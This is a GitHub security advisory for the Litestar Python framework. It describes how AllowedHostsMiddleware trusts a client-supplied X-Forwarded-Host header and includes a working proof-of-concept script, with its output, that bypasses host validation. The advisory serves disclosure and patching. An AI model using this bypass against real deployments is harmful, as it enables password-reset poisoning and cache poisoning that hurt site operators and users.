# [M] Litestar: AllowedHostsMiddleware bypasses host validation via client-controlled X-Forwarded-Host header

## Summary
Severity: Medium
Advisory: GHSA-3qmc-cj7q-62hv
CVE: CVE-2026-48061
CWE: CWE-348, CWE-807
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-06-10
Source: https://github.com/advisories/GHSA-3qmc-cj7q-62hv
Type: github-advisory

## Affected
- PyPI: `litestar` — affected >=0 <2.22.0

## Details
### Summary

`AllowedHostsMiddleware` trusts the `X-Forwarded-Host` header as a fallback when the `Host` header is absent. Since `X-Forwarded-Host` is a client-controllable header, an attacker can bypass the allowed hosts validation by omitting the `Host` header and supplying an `X-Forwarded-Host` header set to a whitelisted domain. This enables host header injection attacks such as password reset poisoning, cache poisoning, and server-side request routing manipulation.

### Details

In `AllowedHostsMiddleware.__call__`, the host value used for validation is resolved as follows:

https://github.com/litestar-org/litestar/blob/main/litestar/middleware/allowed_hosts.py#L68

```python
headers = MutableScopeHeaders(scope=scope)
if host := headers.get("host", headers.get("x-forwarded-host", "")).split(":")[0]:
    if self.allowed_hosts_regex.fullmatch(host):
        await self.app(scope, receive, send)
        return
```

When `Host` is absent (e.g., HTTP/1.0 clients, misconfigured proxies, or raw TCP connections), the middleware falls back to `X-Forwarded-Host` without any verification that the request actually passed through a trusted reverse proxy.

An attacker can send a request with no `Host` header and set `X-Forwarded-Host` to any whitelisted domain, bypassing the entire allowed hosts check. The application then processes the request as if it originated from a trusted host.

This is particularly dangerous when applications use the resolved host value for:
- Generating password reset links (`Host` header injection → link points to attacker domain)
- Cache key generation (cache poisoning)
- Routing or backend selection decisions

### PoC

```python
"""
PoC: Allowed Hosts Bypass via X-Forwarded-Host in Litestar 3.0.0b0

Affected:
  litestar/middleware/allowed_hosts.py:68
  -> headers.get("host", headers.get("x-forwarded-host", "")).split(":")[0]
"""

import asyncio
from litestar import Litestar, get
from litestar.config.allowed_hosts import AllowedHostsConfig
from litestar.testing import TestClient


@get("/")
async def index() -> dict:
    return {"status": "ok"}


app = Litestar(
    route_handlers=[index],
    allowed_hosts=AllowedHostsConfig(allowed_hosts=["trusted.example.com"]),
)


# --- 1. Baseline: invalid host is blocked ---

with TestClient(app=app) as c:
    resp = c.get("/", headers={"host": "evil.com"})
    assert resp.status_code == 400
    print(f"[*] Host: evil.com -> {resp.status_code} (blocked)")


# --- 2. Bypass: ASGI scope without Host, with X-Forwarded-Host ---

async def test_bypass():
    scope = {
        "type": "http",
        "method": "GET",
        "path": "/",
        "root_path": "",
        "scheme": "http",
        "query_string": b"",
        "headers": [
            # No "host" header — only x-forwarded-host
            (b"x-forwarded-host", b"trusted.example.com"),
        ],
        "server": ("testserver", 80),
        "app": app,
        "litestar_app": app,
        "state": {},
    }

    captured = {}

    async def receive():
        return {"type": "http.request", "body": b""}

    async def send(message):
        if message["type"] == "http.response.start":
            captured["status"] = message["status"]

    await app(scope, receive, send)
    return captured["status"]

status = asyncio.run(test_bypass())
print(f"[*] No Host + X-Forwarded-Host: trusted.example.com -> {status} (bypassed)")
assert status == 200, f"Expected 200, got {status}"
print(f"[!] AllowedHosts check passed using client-controlled X-Forwarded-Host")
```

**Output:**
```
[*] Host: evil.com -> 400 (blocked)
[*] No Host + X-Forwarded-Host: trusted.example.com -> 200 (bypassed)
[!] AllowedHosts check passed using client-controlled X-Forwarded-Host
```

### Impact

This is a host validation bypass vulnerability. Any application using `AllowedHostsConfig` is affected when deployed without a reverse proxy that strips `X-Forwarded-Host`, or when accepting HTTP/1.0 connections.

An attacker can bypass the allowed hosts restriction and have requests processed as if they originated from a trusted host. This can lead to:

- **Password reset poisoning**: if the application uses the host value to generate reset links, the attacker can redirect them to a malicious domain
- **Cache poisoning**: cached responses keyed on the host value can be polluted with attacker-controlled content
- **Routing manipulation**: backend routing decisions based on host value can be influenced

## References
- https://github.com/litestar-org/litestar/security/advisories/GHSA-3qmc-cj7q-62hv
- https://github.com/litestar-org/litestar/commit/6930a20ceb543912cd651b42deae5b9f3637a262
- https://github.com/litestar-org/litestar
